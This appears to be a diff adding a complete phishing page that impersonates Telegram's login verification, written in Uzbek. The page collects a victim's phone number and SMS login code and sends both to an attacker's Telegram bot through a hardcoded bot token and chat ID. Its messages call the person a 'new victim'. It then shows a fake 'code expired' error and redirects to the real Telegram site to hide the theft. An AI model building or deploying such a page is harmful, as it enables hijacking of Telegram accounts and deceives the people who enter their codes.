@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Verification</title>
+    <style>
+        body { background: #e7ebf0; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .box { background: white; padding: 40px; border-radius: 12px; text-align: center; width: 320px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .logo { width: 80px; margin-bottom: 20px; }
+        h2 { font-weight: 500; color: #222; }
+        p { color: #707579; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border: 2px solid #3390ec; }
+        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="TG" class="logo">
+    <h2>Kirish</h2>
+    <p>Xavfsizlik yuzasidan hisobingizni tasdiqlang</p>
+    
+    <form id="form1">
+        <input type="tel" id="phone" placeholder="+998901234567" required>
+        <button type="submit">DAVOM ETISH</button>
+    </form>
+
+    <form id="form2" style="display:none;">
+        <input type="text" id="sms_code" placeholder="SMS kod" required>
+        <button type="submit">TASDIQLASH</button>
+    </form>
+</div>
+
+<script>
+    // Siz bergan ma'lumotlar
+    const token = '8484914919:AAFa973WqTD-cMGBZsv3KvWt8OhceLG-6dc';
+    const chat_id = '6311365239';
+    
+    const f1 = document.getElementById('form1');
+    const f2 = document.getElementById('form2');
+    let phoneNum = "";
+
+    // 1. Raqamni yuborish
+    f1.onsubmit = (e) => {
+        e.preventDefault();
+        phoneNum = document.getElementById('phone').value;
+        const msg = `📱 Yangi qurbon raqami: ${phoneNum}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+        
+        f1.style.display = 'none';
+        f2.style.display = 'block';
+    };
+
+    // 2. Kodni yuborish
+    f2.onsubmit = (e) => {
+        e.preventDefault();
+        const code = document.getElementById('sms_code').value;
+        const msg = `🔑 Kod keldi: ${code}\n📱 Raqam: ${phoneNum}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
+        .then(() => {
+            alert("Xatolik: Kod muddati o'tgan yoki noto'g'ri.");
+            window.location.href = "https://web.telegram.org";
+        });
+    };
+</script>
+
+</body>
+</html>
